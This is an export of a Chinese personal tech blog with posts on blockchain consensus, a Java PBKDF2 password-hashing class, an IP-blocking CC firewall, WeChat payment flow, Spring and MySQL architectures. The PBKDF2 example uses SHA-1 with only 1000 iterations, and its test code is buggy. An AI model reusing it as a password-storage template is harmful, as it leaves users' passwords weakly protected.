私钥签名，公钥能够验证是不是对应的私钥签名的 把公钥和签名广播出去，nodes可以验证交易的有效性。 篡改无效签名的信息确实是签名者本人的意愿，nodes能对此进行确认。 PKI中利用CA颁发证书的方式来确定网络中的身份 对于公有链，peer可以自由加入，退出，并不需要一个中心化的CA来对身份进行认证;联盟链，peer的身份和权限可利用该机制来实现，比如hyperledger中的msp 比特币的交易: 这就回答了，如何做到确保某个address的数字只能由拥有它的人来操作的问题。 7.2 SHA(Secure Hash Algorithm) 任意长度的数据-&gt;固定长度的数据 相同input-&gt;相同output 冲突几率很小,改变input的一个字符，output都会不同 验证hash value很容易，反推很难 计算一个任意长度input的hash value非常快，但是给出一个output，要算出input却非常难，目前只有遍历试验的方法。Bitcoin中会根据目前的平均出块速度，给出一个ouput,谁先构造出hash(input)小于该output的数据，谁就拥有当前出块的权利。这个遍历试验的过程就叫做挖矿(mining)，当某个peer找到符合条件的input,它会广播给其他peer,其他peer对其进行验证，这个遍历试验并向大家证明的过程，就叫做POW;而每一次出块会有一定的奖励，这个奖励是比特币产生(coinbase)的唯一方式,而区块中确认交易的output和input的差额就是给记账peer的手续费(transaction fee)。 而做到交易记录无法篡改和可追溯,还需要block chain这种数据结构。 8. Hash chain &amp;&amp; Block chainblock chain其实是一种特殊的hash chain。 首先，数据是存在分布式网络的各个节点中的，这些节点有可能有些是坏人，”不可篡改“是指整个分布式网络对外提供的block chain data是”不可篡改”的。恶意节点的篡改，得不到承认，并且不影响对外的服务。 比特币中的好人们商量好:我们只认best block chain,就是符合规则(consensus mechanism)并且最长的那条链。 下面结合block chain的具体结构和相应的consensus mechanism来说明,why”不可篡改”? block chain数据结构的特点是: 链式存储，从任何一个block可以找到其前面的block 且每一个block(Genesis block除外)有上一个block的hash 由于hash的”冲突几率很小,改变input的一个字符，output都会不同“的特性，改变一个区块的数据将会导致后面区块的hash对不上，也许你会说,”改变后面block的hash不就行了？”，但是，由于后面的block也改变了，那么其hash也改变了，而一个block有效的一个必要条件: hash(block)&lt;根据当前平均出块速度计算出的target 系统会计算当前1小时的平均出块速度，动态调整difficulty,得出一个target，而一个有效的区块，不但要拥有前一个区块的hash,还必须计算出一个nonce,使得当前block的hash值小于该target。 这意味着，改变任何一个block,并且想跟上目前最长的链，需要重做生成后面所有block的工作量。 而这是非常难的。 理论上，跟所有honest peers竞争，掌握51%以上的算力是有可能对数据进行篡改的，但是，假如你的算力真的非常强，你可以把交易都篡改了，这是否能让你的利益最大化呢？首先，这个篡改肯定会被发现，当honest peers发现很长的不匹配block时，会发出告警，然后用户也会知道，这会导致什么结果呢？一个必然的结果是：系统无法被人信任，价值归0。而拥有强大的算力，并且选择做honest peer，你会获得不错的稳定收益;这就导致强大的算力更倾向于做honest peer,而拥有越多强大算力的honest peer,整个系统就越难被攻破。这就是人性，这就是市场。 所以，比特币里面不可篡改的保证靠的是:POW + block chain存储 + 激励措施的博弈 但是，这里一个很致命的问题是:POW太浪费电了…… 那么，有没有既不浪费电又能够保证”不可篡改”的办法呢？ 至少，在”去中心化”的条件下是很难实现的。 PoS(Proof of Stake) 相当于越有钱，越有话语权(挖矿或者确认交易)，意思是越有钱越想维持这个系统，越不会想破坏这个系统，从而数据也是”不可篡改的”;但是，这个将导致一个很明显的结果:有钱的会越来越有钱。越来越集中化。 PBFT(Practical Byzantine Fault Tolerance )? 意思是n个peers互相交换对new block的看法，然后honest peer取majority(n-1)的看法来决定new block是否合法,可以证明，只要坏人不超过 (n-1) / 3 ，整个系统就是按honest peer来运行的。 “不可篡改”的保证在于:你需要majority的同意(一般通过签名来保证)，而少数恶意节点显然做不到。 为了交易速度和省电，目前很多加密货币采用了Pos;而PBFT由于需要知道有多少其他peers并能识别其签名，一般适合私有链，联盟链。 需要注意的是，区块链里面说的共识算法，跟一般分布式系统里面的paxos,raft等一致性协议相比,除了关注网络本身的失效外，还需要对数据的安全性，合约的有效性做很多的工作。 9. Blockchain(区块链)所以，其实给区块链下一个定义不是一件容易的事情。 wikipedia: A blockchain, originally block chain, is a continuously growing list of records, called blocks, which are linked and secured using cryptography. Each block typically contains a cryptographic hash of the previous block, a timestamp and transaction data. investopedia: A blockchain is a digitized, decentralized, public ledger of all cryptocurrency transactions. Constantly growing as ‘completed’ blocks (the most recent transactions) are recorded and added to it in chronological order, it allows market participants to keep track of digital currency transactions without central recordkeeping. Each node (a computer connected to the network) gets a copy of the blockchain, which is downloaded automatically. 百度百科: 狭义来讲，区块链是一种按照时间顺序将数据区块以顺序相连的方式组合成的一种链式数据结构， 并以密码学方式保证的不可篡改和不可伪造的分布式账本。 广义来讲，区块链技术是利用块链式数据结构来验证与存储数据、利用分布式节点共识算法来生成和更新数据、利用密码学的方式保证数据传输和访问的安全、利用由自动化脚本代码组成的智能合约来编程和操作数据的一种全新的分布式基础架构与计算方式。 感觉每一个说得都很有道理,也确实都很有道理。 不管如何，上面说的原理部分，基本上就是区块链最核心的部分，虽然各种具体实现有很多细节的不同，但原理就这些了。 而根据区块链发展的历史，智能合约的引入就进入了所谓的区块链2.0时代。 连接移动端,Iot就进入了所谓的区块链3.0时代。 是不是有种被时代抛弃的感觉？劳资还在守着java当饭碗，侬都区块链3.0了？ 10. Smart contract(智能合约)10.1 比特币的脚本语言其实代表区块链1.0的比特币也没有那么不智能，我们来看其交易验证的逻辑: 交易必须遵守以下规则: 任何一个input必须来自于某一个output 一笔交易，可以有多个input,多个output 为了方便，input被spend后就作废了，如果有change(找零)，也体现在output中 可以推断，这科树的叶子记录的address对应的资产就是当前整个比特币的资产状况 叶子上的output也叫UTXO(Unspent Transaction Output) 有效的input必须来自UTXO UXTO里面有public key的hash,对其操作必须提供private key签名和public key 网络节点根据共识机制维护公共账本,这实际上解决了spend twice的问题 这里的验证逻辑就是contract(合约)。 Public script包含了UTXO对应的Publick key的hash Signature script包含了private key的签名以及public key 被签名的信息包含下一个UXTO的Public script和amount 这里的script是一种非图灵完备的stack-based的脚本语言。 Public script：1OP_DUP OP_HASH160 &lt;PubkeyHash&gt; OP_EQUALVERIFY OP_CHECKSIG Signature script1&lt;Sig&gt; &lt;PubKey&gt; OP_DUP OP_HASH160 &lt;PubkeyHash&gt; OP_EQUALVERIFY OP_CHECKSIG 其执行过程如下: 每个节点都会对收到的transaction自动执行以上的验证逻辑。 而如果支持图灵完备语言来编写合约，并可动态部署，就叫智能合约。 10.2 Hyperledger-fabric的chaincode以太坊，超级账本等区块链2.0平台支持智能合约，本质上就是提供一个可编程的区块链平台，底层的区块链存储，一致性机制等通用的东西给你搭好了，你可以在上面很方便的编写自己的应用。 可以理解为一种paas,编程框架和云平台的结合。 下面就Hyperledger-fabric的chaincode来做具体说明。 所谓编写chaincode,其实就是提供一些服务，这些服务会对KV进行操作，这里的隐含条件是: KV的变更其实就是transaction,会遵守consensus记录到公共账本上 对某个Key的操作，是否需要相应的权限，取决于你的实现 大家约定需要权限，那就需要权限，约定不需要，那就不需要；也可以某些需要，某些不需要 原则上比特币的coinbase,PubScript+SigScript解锁的操作方式都可以实现在chaincode中 所以，其实chaincode的framework其实只是提供了get,set的最基本的方法 部署chaincode和调用chaincode的权限也是可以大家商量的 这种非常灵活的方式，能做的东西非常多 但是整个权限的约定，chaincode的编写，部署都非常繁琐 并且现在hyperledger fabric并没有一个统一的管理这些东西的地方 不理解底层原理，搞起来还是相当麻烦 联系方式QQ群:300911873 目前正在迭代的项目: https://github.com/foolcage/mastering-fabric https://github.com/foolcage/fooltrader 欢迎关注 一起探讨]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[慢哈希加密]]></title>
    <url>%2F2018%2F07%2F02%2Fencryption%2Fpassword-java-pbkdf2%2F</url>
    <content type="text"><![CDATA[PBKDF2算法【三种】介绍： wiki 加盐密码哈希：如何正确使用 PBKDF2加密的实现 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168//PBKDF2import javax.crypto.SecretKeyFactory;import javax.crypto.spec.PBEKeySpec;import java.math.BigInteger;import java.security.NoSuchAlgorithmException;import java.security.SecureRandom;import java.security.spec.InvalidKeySpecException;/** * Created by huoyan403 on 3/21/2017. */public class PasswordEncryption &#123; public static final String PBKDF2_ALGORITHM = &quot;PBKDF2WithHmacSHA1&quot;; // The following constants may be changed without breaking existing hashes. /** * 盐的长度---不宜过短 */ public static final int SALT_BYTE_SIZE = 48 / 2; /** * 生成密文的长度 */ public static final int HASH_BYTE_SIZE = 32 / 2; /** * 迭代次数 */ public static final int PBKDF2_ITERATIONS = 1000; public static final int ITERATION_INDEX = 0; public static final int SALT_INDEX = 1; public static final int PBKDF2_INDEX = 2; /** * Returns a salted PBKDF2 hash of the password. * 加密password * @param password the password to hash * @return a salted PBKDF2 hash of the password */ public static String createHash(String password) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; return createHash(password.toCharArray()); &#125; /** * Returns a salted PBKDF2 hash of the password. * * @param password the password to hash * @return a salted PBKDF2 hash of the password */ public static String createHash(char[] password) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; // Generate a random salt SecureRandom random = new SecureRandom(); byte[] salt = new byte[SALT_BYTE_SIZE]; random.nextBytes(salt); // Hash the password byte[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE); // format iterations:salt:hash return PBKDF2_ITERATIONS + &quot;:&quot; + toHex(salt) + &quot;:&quot; + toHex(hash); &#125; /** * Validates a password using a hash. * 验证密码是否正确 需传password和 加密后的序列值 * @param password the password to check * @param correctHash the hash of the valid password * @return true if the password is correct, false if not */ public static boolean validatePassword(String password, String correctHash) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; return validatePassword(password.toCharArray(), correctHash); &#125; /** * Validates a password using a hash. * * @param password the password to check * @param correctHash the hash of the valid password * @return true if the password is correct, false if not */ public static boolean validatePassword(char[] password, String correctHash) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; // Decode the hash into its parameters String[] params = correctHash.split(&quot;:&quot;); int iterations = Integer.parseInt(params[ITERATION_INDEX]); byte[] salt = fromHex(params[SALT_INDEX]); byte[] hash = fromHex(params[PBKDF2_INDEX]); // Compute the hash of the provided password, using the same salt, // iteration count, and hash length byte[] testHash = pbkdf2(password, salt, iterations, hash.length); // Compare the hashes in constant time. The password is correct if // both hashes match. return slowEquals(hash, testHash); &#125; /** * Compares two byte arrays in length-constant time. This comparison method * is used so that password hashes cannot be extracted from an on-line * system using a timing attack and then attacked off-line. * * @param a the first byte array * @param b the second byte array * @return true if both byte arrays are the same, false if not */ private static boolean slowEquals(byte[] a, byte[] b) &#123; int diff = a.length ^ b.length; for(int i = 0; i &lt; a.length &amp;&amp; i &lt; b.length; i++) diff |= a[i] ^ b[i]; return diff == 0; &#125; /** * Computes the PBKDF2 hash of a password. * * @param password the password to hash. * @param salt the salt * @param iterations the iteration count (slowness factor) * @param bytes the length of the hash to compute in bytes * @return the PBDKF2 hash of the password */ private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8); SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM); return skf.generateSecret(spec).getEncoded(); &#125; /** * Converts a string of hexadecimal characters into a byte array. * * @param hex the hex string * @return the hex string decoded into a byte array */ private static byte[] fromHex(String hex) &#123; byte[] binary = new byte[hex.length() / 2]; for(int i = 0; i &lt; binary.length; i++) &#123; binary[i] = (byte)Integer.parseInt(hex.substring(2*i, 2*i+2), 16); &#125; return binary; &#125; /** * Converts a byte array into a hexadecimal string. * * @param array the byte array to convert * @return a length*2 character string encoding the byte array */ private static String toHex(byte[] array) &#123; BigInteger bi = new BigInteger(1, array); String hex = bi.toString(16); int paddingLength = (array.length * 2) - hex.length(); if(paddingLength &gt; 0) return String.format(&quot;%0&quot; + paddingLength + &quot;d&quot;, 0) + hex; else return hex; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 //test类import com.meirengu.common.PasswordEncryption;import static com.meirengu.common.PasswordEncryption.createHash;import static com.meirengu.common.PasswordEncryption.validatePassword;/** * Created by huoyan403 on 3/21/2017. */public class PasswordEncryptionTest &#123; /** * Tests the basic functionality of the PasswordHash class * * @param args ignored */ public static void main(String[] args) &#123; try &#123; // Print out 10 hashes for(int i = 0; i &lt; 10; i++) System.out.println(createHash(&quot;p\r\nassw0Rd!&quot;)); // Test password validation boolean failure = false; System.out.println(&quot;Running tests...&quot;); for(int i = 0; i &lt; 100; i++) &#123; String password = &quot;&quot;+i; String hash = createHash(password); String secondHash = createHash(password); if(hash.equals(secondHash)) &#123; System.out.println(&quot;FAILURE: TWO HASHES ARE EQUAL!&quot;); failure = true; &#125; String wrongPassword = &quot;&quot;+(i+1); if(PasswordEncryption.validatePassword(wrongPassword,password)) &#123; System.out.println(&quot;FAILURE: WRONG PASSWORD ACCEPTED!&quot;); failure = true; &#125; if(!PasswordEncryption.validatePassword(password, hash)) &#123; System.out.println(&quot;FAILURE: GOOD PASSWORD NOT ACCEPTED!&quot;); failure = true; &#125; &#125; if(failure) System.out.println(&quot;TESTS FAILED!&quot;); else System.out.println(&quot;TESTS PASSED!&quot;); System.err.print(validatePassword(&quot;&quot;,&quot;1000:29bcf0ef3b1f33698b2254415caf7c81957770883a8b65b7:d9cb6f281a95c4a44415b5e5e37fb607&quot;)); System.err.print(createHash(&quot;123456&quot;)); &#125; catch(Exception ex) &#123; System.out.println(&quot;ERROR: &quot; + ex); &#125; &#125;&#125; 123456123456----加密后--&gt;1000:29bcf0ef3b1f33698b2254415caf7c81957770883a8b65b7:d9cb6f281a95c4a44415b5e5e37fb60不可逆 验证只能使用validataPassword(&quot;原密码&quot;，&quot;加密后密码&quot;)遵从原则：密码不通过where 1=1 and password = #&#123;password&#125;保证代码验证过程中没有任何地方使用原密码原文查询、比对]]></content>
      <categories>
        <category>java</category>
        <category>password</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈区块链对互联网的冲击]]></title>
    <url>%2F2018%2F07%2F02%2Fblock-chain%2Fblock-chain-0%2F</url>
    <content type="text"><![CDATA[区块链 起源于比特币、不对、应该是说、区块链理论的第一应用是比特币 是日本一位大佬、看透了金融行业金融机构对货币的管理和控制能力、金融机构可以任意发行货币、日本那次经济危机有关吧、 区块链涉及的新技术 有： 去中心化、采取共识机制来获取最值得信任的交易链、 智能合约、不借助第三方签订协议、这种协议一旦生效不可修改、可追溯 {———-} 去中心化： 现在互联网技术的交易基本上都是有第三方担保、比如淘宝的支付宝、以及货币发行机构各大银行 这种新技术是怎么改变互联网世界的架构的呢？ 首先这种不适用第三方担保的协议、可以无视第三方支付平台的兴衰而动荡、 然后结合去中心化和智能合约、有些人头一次接触这种思维方式、于是很多人的思考就诞生了一波思维风暴 银行去中心化、货币去中心化、法律去中心化、等等各个行业的去中心化、共识机制、其实我觉得蛮不现实的、机器会共识、人可不一定、人心可以收买的、没有一个良好的信任体系、共识机制也只是一个泡沫而已 再说智能合约、法律智能合约、货币交易智能合约、物联网智能合约、也是各个方面各个行业都可以嵌入 智能合约可以用来在多方的情况下、动态的签署一份使用合约、随后由去中心化的货币再进行支付自动转账 法律：甲乙丙三方 签订一个合约、到期后合约执行、货币支付或者行为交易、这份合约保存到信任链条中永久保存 物联网：家电、车、购物、都可以接入智能合约、进行一个行为合约、然后通知货币链支付 看起来就一个完全自由化的社会 关于共识机制的解决方案 公有链——对任何人开放，任何人都能参与公有链通常也称为非许可链（Permissionless Blockchain）， 任何人都可以参与区块链数据维护和读取，容易部署应用程序，完全去中心化不受任何机构控制。 公有链的应用非常广泛，例如资产证券化、数字资产的跨链流通 ……现在市场上的主流大势区块链项目比特币、以太坊、量子链、EOS、唯链以及Neo等都是公有链项目。 公有链是真正意义上的完全去中心化的区块链，它通过密码学保证交易不可篡改，同时也利用密码学验证以及经济上的激励， 在互为陌生的网络环境中建立共识，从而形成去中心化的信用机制。在公有链中的共识机制一般是工作量证明（PoW）和权益证明（PoS） 。 公有链具有通过去中介化的方式打破当前中心化商业模式的潜力， 而且本身无需维护服务器或管理系统，从根本上降低创建和运行去中心化应用程序（dApp）的成本。 联盟链——仅对联盟成员开放联盟链是一种需要注册许可的区块链，这种区块链也称为许可链（Permissioned Blockchain）。 联盟链仅限于联盟成员参与，联盟规模可以大到国与国之间，也可以是不同的机构企业之间。 区块链上的读写权限、参与记账权限按联盟规则来制定。 整个网络由成员机构共同维护，网络接入一般通过成员机构的网关节点接入，共识过程由预先选好的节点控制。 因此联盟链一般不采用工作量证明的挖矿机制，而是多采用权益证明（PoS）或PBFT（Practical Byzantine Fault Tolerant）、RAFT等共识算法。 和公有链最高每秒完成交易3-20相比，联盟链可以达到1000-10000 ，交易速度更快且交易成本大幅降低。 联盟链可以解决结算问题，降低两地结算的成本和时间，适合于机构间的交易、结算等B2B场景，因此金融行业应用最广泛。 其中最知名的就是R3CVE组织，即R3联盟，有包括花旗银行、中国平安银行、纽约梅隆银行在内的50多家银行机构加入 私有链——仅行业内部透明，不对外开放私有链，仅限于企业、国家机构或者单独个体使用，不完全能够解决信任问题，但是可以改善可审计性。 常用于企业内部的数据库管理、审计等，政府的预算和执行，或者政府的行业统计数据等。 他们彼此之间需要透明，但没必要对外公众透明。 私有链的价值主要是提供安全、可追溯、不可篡改、自动执行的运算平台， 可以同时防范来自内部和外部对数据的安全攻击，这个在传统的系统是很难做到的。 任何人都可以创建私链的平台的Multichain项目本身就是一个私有链项目。 另： 123456789101112不管区块链是不是泡沫。反正各大佬已经部署未来了、阿里、腾讯、百度、京东也在看形势、还有众多小企业在瞄准区块链猛打擦边球、毕竟这是一个机会也是一个机遇、不走未必能活、走了就可能一夜发达、互联网时代、数据时代、人工智能时代、区块链时代、小视频时代、老博客时代、共享社会、这个世界、名词化社会、动不动就我们重新定义了XXX、、、、、这样拉融资也算个噱头、、不过也可以看出机遇、机会是真的多、看准未来【未来在变、我们也要变】、and 、坚持以获成功]]></content>
      <categories>
        <category>block-chain</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Strom的日志实时流量分析主动防御(CCFirewall)系统]]></title>
    <url>%2F2018%2F07%2F01%2Fgithub%2Fcc-iptable%2F</url>
    <content type="text"><![CDATA[CC防火墙 github 地址简介CC防火墙的架构采用Flume+Kafka+Strom+Zookeeper+Mysql实现,实现异常IP的及时封停功能 组件 Flume :部署在所有的Nginx服务器上，将Nginx日志推送至Kafka中， Kafka : 临时存储Nginx的log数据 Strom ：从Kafka取数据并进行数据分析 Zookeeper ：存储CC防火墙的配置文件，并且所有部署在Squid上的客户端也注册在这个Zookeeper上。 Agent ：部署在每台Squid上，并且信息注册到Zookeeper的临时节点上，接收到封停指令后通过iptables封锁IP。 {———-} Strom拓扑 KafkaSpOut：进行Kafka数据的读取，这里为了方便与简单，并且保证顺序性Kafka内只是用一个Partion。 LogFormatBolt : 收到KafkaSpout读取出的Nginx日志后进行格式化处理，并在此使用纯真库进行IP GEO匹配 IpAnalysis ： 几乎所有的逻辑都在这里实现，如IP的计数器，报警的匹配等等，为了可以动态调整防火墙的配置，配置文件保存在Zookeeper中，也是在这里Watch Zookeeper的节点，达到动态改变配置的。 BlockBolt ： 接收到IpAnalysis 发送的信息后，将异常的信息通过Thrift发送给各个Squid机器。 UnBlockBolt ： 接收到BlockBolt成功封锁后的IP后经过一段时间进行解封。 BlockReportBlot ： 做数据统计用的，对整体的作用不大 xStoreBolt ： 数据库存储Bolt，拓扑上的IPStoreBolt，BlockStoreBolt，BlockReportStoreBolt 都是使用的这一个Bolt。 Thrit封存解封接口service CCfirewall{ string blockipbyiptables(1:string mkey,2: string ip) string unblockipbyiptables(1:string mkey,2: string ip) } Zookeeper目录目录树 . └─ccfirewall ├─config //存储防火墙配置信息 └─agent_list //存储Agent列表 └─iptables //使用iptables封锁的站点 ├─10.0.0.1 ├─10.0.0.1 ├─... config配置 { &quot;count&quot;: &quot;50&quot;, //IP计数个数 &quot;if_block&quot;: &quot;true&quot;, //是否开启封停 &quot;if_warning&quot;: &quot;false&quot;, //是否开启警告 &quot;threshold_w_secound&quot;: &quot;10&quot;, //警告阈值秒数 &quot;threshold_secound&quot;: &quot;20&quot;, //封停阈值秒数 &quot;block_second&quot;: &quot;864000&quot;, //封停秒数 &quot;ip_white_list&quot;: [ //IP白名单 &quot;127.0.0.1&quot;, &quot;211.103.231.10&quot; ], &quot;url_list&quot;: [{ //URL黑名单 &quot;url&quot;: &quot;all&quot;, //全部 &quot;type&quot;: &quot;normal&quot; //normal (精确) 或 after (向后模糊) }], &quot;special_rule&quot;: { //特殊规则 &quot;reg.gyyx.cn/Login/Async&quot;: { //URL &quot;threshold_w_secound&quot;: &quot;100&quot;, //警告阈值秒数 &quot;threshold_secound&quot;: &quot;300&quot;, //封停阈值秒数 &quot;block_second&quot;: &quot;86400&quot; //封停秒数 } } } 数据库模型 Agent启动Agent python CCFirewall.py 本机IP 前端左上方可以设置防火前的配置，保存后实时生效，中上方可以查看当前已经上线的客户端，点击详情可以看到此客户端已经封停的IP格式，右上方可以看到曲线，地图，已经两个计数器信息 左下方显示最新的达到计数器的条目，右下方可以看到异常IP在客户端的封锁状况。]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tengine]]></title>
    <url>%2F2018%2F07%2F01%2Fgithub%2Ftengine%2F</url>
    <content type="text"><![CDATA[基于nginx更强大的web服务器负载均衡器简介Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。 从2011年12月开始，Tengine成为一个开源项目，Tengine团队在积极地开发和维护着它。Tengine团队的核心成员来自于淘宝、搜狗等互联网企业。Tengine是社区合作的成果，我们欢迎大家参与其中，贡献自己的力量。 {———-} Tengine文档http://tengine.taobao.org https://github.com/alibaba/tengine]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信H5支付]]></title>
    <url>%2F2018%2F06%2F30%2Fessay%2Fweichat-h5-pay%2F</url>
    <content type="text"><![CDATA[微信支付流程 微信支付流程 大概就是这个样子、也包括支付宝、各大银联差不多一个流程、也就是传递的参数略有不同 用户通过客户端下一个订单、 后台根据用户下的商品来生成一个订单、 然后可以有一个订单确认页面 以显示订单是否完整 之后确认订单、把订单信息发送给微信 生成预支付信息【订单需要支付了、我告诉微信一下、我这有个订单要用你的支付了】 之后用微信返回的预支付信息来调起微信支付【微信表示我收到了、我给你个密钥、你用它去找我的管家要钱就行了】 用户输入密码、确认支付【用户拿着密钥找管家、我要买这个、这是我的账户密码】 支付完成、微信告诉客户端的服务器、他买完了、并且成功了、【微信大佬告诉你后台”也就是你老婆”你丈夫在我这买了个这个】 {———-} 核心部分是这么个流程 当然 再接入微信支付前 要判断你对这个网站的拥有权需要在你的服务器 上传一个文件作为验证、这个跟站长在百度等各大搜索引擎验证身份一个意思 还要配置 回调地址 以防止数据被篡改、保证安全性、 对于服务之间的通信全程都是https加密类型-混合型加密技术]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring 理解]]></title>
    <url>%2F2018%2F06%2F30%2Fspring%2F01%2F</url>
    <content type="text"><![CDATA[想到—你对spring理解的面试题spring 呢 是由java语言开发得一个框架这个框架得主要作用呢 是方便开发者更便捷得开发程序、它主要封装了java类的反射、以及容器启动后类互相之间调用问题 熟悉 spring得都了解 spring 有两个主要特性 IOC AOP 简单描述spring呢 也就这两个控制反转和依赖注入 面向切面 控制反转 是解决类的统一反射 主要作用是将java原生类 由spring框架反射这个类的信息 在容器初始化后调用依赖注入 是解决各个类之间互相调用问题、类解耦 面向切面 使用动态代理来代理业务逻辑代码的执行 在执行代理层的时候 可以在方法中织入我们想要执行的方法 那么复杂点想想呢复杂点结合容器启动过程、对比所有的你碰到得编程系统、比如linux、win系统启动过程、还有tomcat启动linux : 读取配置文件、加载配置文件、加载系统执行文件、请求内存、加载完毕、刷新上下文tomcat : 读取配置文件、加载配置文件、加载应用jar、加载完毕、刷新上下文win : 读取配置文件、加载配置文件、服务注册到注册表、注册表启动必须程序、启动完毕 【像什么启动端口、就不谈了、了解程序启动步骤、想的还是有点浅、待完善】 1、寻找配置文件、加载配置【这跟是系统上的设置一样、读取用户设置你再开机】2、读取到配置文件、接下来启动jdk、这里就不讲、也将不明白3、spring要读取 我们写的java类文件、将其反射到内存中、用来调用4、启动完成检查启动项是否都已将ok、刷新上下文 第二部呢 涉及到jdk以及c之间的启动、 这里可以大概猜想下、 spring启动-本身也是java文件、jdk编译spring文件、那么要编译spring文件按照java中得双亲委派机制要编写父类 当然所有的父类都会刀jdk中、那么也就是说先编译jdk、 jdk启动后、启动spring基类包文件、spring编译完成、读取配置文件、去编译我们得应用jar、我们的应用jar又会有基类包文件、 转向再去编写基类【也就是应用上的依赖包和父类包】 当应用jar编译完成后、进入反射分配内存阶段 统计所有java类信息、需要内存信息、分配内存、把各个类得对象信息放到方法区【1.8里叫 元数据区 也好理解、所有class得计算机内存区、在请求之后是数据运行区就】 上边呢把整个应用得编译、分配内存、大概才想了一下 那么程序事怎么运行的呢？ 也可以猜想下 一堆内存数据、访问该到哪里接入？ 为什么就到spring controller里了呢？ 我可以做这样一个设想 我有一块专门的请求处理区。 这里呢 我放一个匹配器、所有的请求来了都到这、把url一截断处理 我们能得到不同的字符 这个字符呢 也就对应着 不用controller=的url 然后根据这个字符找到不同的方法区对应的方法地址 就可以往下的内存中链形行走了 ** 有一个特别有意思的事情 spring容器启动过程中、类循环调用 两个基类包调用了同一个类、在容器启动时候导致类循环调用启动失败 把上边类启动过程搞明白了、一琢磨就想到哪里出问题了、类启动初始化bean的过程中、有bean初始化一半的时候、碰到了另一个类对他同时也进行初始化 【至于为什么会这样、在类的初始化过程中、也是分类好几步、毕竟一个类的初始化不能一步到位、就在这个初始化中】 问题就到了类初始化问题 那么类的初始化、刨除双亲委派机制 父类初始化完毕才能初始化子类 剩下就是 类初始化 要初始化引用注入java类 类循环调用就在这里出现了、a类初始化、需要初始化b、b类初始化需要初始化c、c类初始化需要初始化a、 解决办法：lazy load 当然这样的引用常出现在糅合配置类上、如果配置清晰、也不会有这样的问题 spring bean初始化过程]]></content>
      <categories>
        <category>java</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL经典架构]]></title>
    <url>%2F2018%2F06%2F29%2Fmysql%2Fmysql-solution%2F</url>
    <content type="text"><![CDATA[mysql主从复制 此种架构，一般初创企业比较常用，也便于后面步步的扩展 此架构特点： 1、成本低，布署快速、方便 2、读写分离 3、还能通过及时增加从库来减少读库压力 4、主库单点故障 5、数据一致性问题（同步延迟造成） {———-} MySQL+MMM架构 通过 DRBD 基于 block 块的复制模式，快速进行双主故障切换，很大程度上解决主库单点故障问题 此架构特点： 1、高可用软件可使用 Heartbeat, 全面负责 VIP、数据与 DRBD 服务的管理 2、主故障后可自动快速切换，并且从库仍然能通过 VIP 与新主库进行数据同步 3、从库也支持读写分离，可使用中间件或程序实现 MySQL+DRDB架构 MHA 目前在 Mysql 高可用方案中应该也是比较成熟和常见的方案，它由日本人开发出来，在 mysql 故障切换过程中，MHA 能做到快速自动切换操作，而且还能最大限度保持数据的一致性 此架构特点： 1、安装布署简单，不影响现有架构 2、自动监控和故障转移 3、保障数据一致性 4、故障切换方式可使用手动或自动多向选择 5、适应范围大（适用任何存储引擎） MySQL+MHA架构 MMM 即 Master-Master Replication Manager for MySQL（mysql 主主复制管理器），是关于 mysql 主主复制配置的监控、故障转移和管理的一套可伸缩的脚本套件（在任何时候只有一个节点可以被写入），这个套件也能基于标准的主从配置的任意数量的从服务器进行读负载均衡，所以你可以用它来在一组居于复制的服务器启动虚拟 ip，除此之外，它还有实现数据备份、节点之间重新同步功能的脚本。MySQL 本身没有提供 replication failover 的解决方案，通过 MMM 方案能实现服务器的故障转移，从而实现 mysql 的高可用。 此方案特点： 1、安全、稳定性较高，可扩展性好 2、 对服务器数量要求至少三台及以上 3、 对双主（主从复制性要求较高） 4、 同样可实现读写分离]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[语音交互]]></title>
    <url>%2F2018%2F06%2F29%2Fai%2Fyuyin-001%2F</url>
    <content type="text"><![CDATA[语音交互发展史 语音交互简介 语音合成【在线、离线】 语音识别【听写、转写、唤醒】 语义理解【AIUI】 语音识别模块【麦克风阵列、语音合成芯片、离线识别模块】 模式识别【人脸识别、声纹识别】 语音扩展【语音测评、机器翻译】 {———-} 语音交互应用场景 导航 智能设备 语音交互组件 AI]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>语音交互</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[atom 快捷键]]></title>
